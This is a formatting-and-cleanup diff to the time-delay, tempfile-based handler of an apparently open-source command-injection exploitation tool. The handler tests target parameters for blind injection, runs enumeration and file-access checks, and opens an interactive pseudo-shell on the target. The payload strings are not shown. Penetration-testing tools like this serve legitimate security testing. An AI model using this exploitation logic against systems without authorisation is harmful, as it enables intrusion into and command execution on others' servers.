@@ -42,7 +42,7 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_fi
 #-------------------------------------------------
 # The "tempfile-based" injection technique handler
 #-------------------------------------------------
-def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
+def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
   
   counter = 0
   vp_flag = True
@@ -84,38 +84,30 @@ def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
           
     # Change TAG on every request to prevent false-positive resutls.
     TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))  
-    
-    # Check if defined "--base64" option.
-    if menu.options.base64_trick == True:
-      B64_ENC_TAG = base64.b64encode(TAG)
-      B64_DEC_TRICK = settings.B64_DEC_TRICK
-    else:
-      B64_ENC_TAG = TAG
-      B64_DEC_TRICK = ""
-      
+
     # The output file for file-based injection technique.
-    OUTPUT_TEXTFILE = tmp_path + B64_ENC_TAG + ".txt"
+    OUTPUT_TEXTFILE = tmp_path + TAG + ".txt"
     alter_shell = menu.options.alter_shell
     tag_length = len(TAG) + 4
     
-    for output_length in range(1,int(tag_length)):
+    for output_length in range(1, int(tag_length)):
       try:
 
         # Tempfile-based decision payload (check if host is vulnerable).
         if alter_shell :
 
-          payload = tfb_payloads.decision_alter_shell(separator,output_length,TAG,OUTPUT_TEXTFILE,delay,http_request_method)
+          payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
   
         else:
-          payload = tfb_payloads.decision(separator,output_length,TAG,OUTPUT_TEXTFILE,delay,http_request_method)
+          payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
 
         # Check if defined "--verbose" option.
         if menu.options.verbose:
           if separator == ";" or separator == "&&" or separator == "||":
-            sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
+            sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
             
         # Check if target host is vulnerable
-        how_long,vuln_parameter = tfb_injector.injection_test(payload,http_request_method,url)
+        how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method, url)
         if not menu.options.verbose:
           percent = ((num_of_chars*100)/total)
           if how_long >= delay:
@@ -186,7 +178,7 @@ def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
           print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + GET_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
           print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
           print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n","\\n"))) + Style.RESET_ALL
+          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n", "\\n"))) + Style.RESET_ALL
             
         else :
           # Print the findings to log file
@@ -209,13 +201,13 @@ def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
           print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + POST_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
           print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
           print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n","\\n")) + Style.RESET_ALL
+          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
         
         # Check for any enumeration options.
-        tfb_enumeration.do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+        tfb_enumeration.do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
         # Check for any enumeration options.
-        tfb_file_access.do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+        tfb_file_access.do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
         
         # Pseudo-Terminal shell
         while True:
@@ -231,7 +223,7 @@ def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
                   
                 else:
                   # The main command injection exploitation.
-                  check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+                  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
                   
                   if menu.options.verbose:
                     print ""
@@ -270,8 +262,8 @@ def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
     sys.stdout.write("\r")
     sys.stdout.flush()
     
-def exploitation(url,delay,filename,tmp_path,http_request_method):
-    if tfb_injection_handler(url,delay,filename,tmp_path,http_request_method) == False:
+def exploitation(url, delay, filename, tmp_path, http_request_method):
+    if tfb_injection_handler(url, delay, filename, tmp_path, http_request_method) == False:
       return False
     
 #eof 
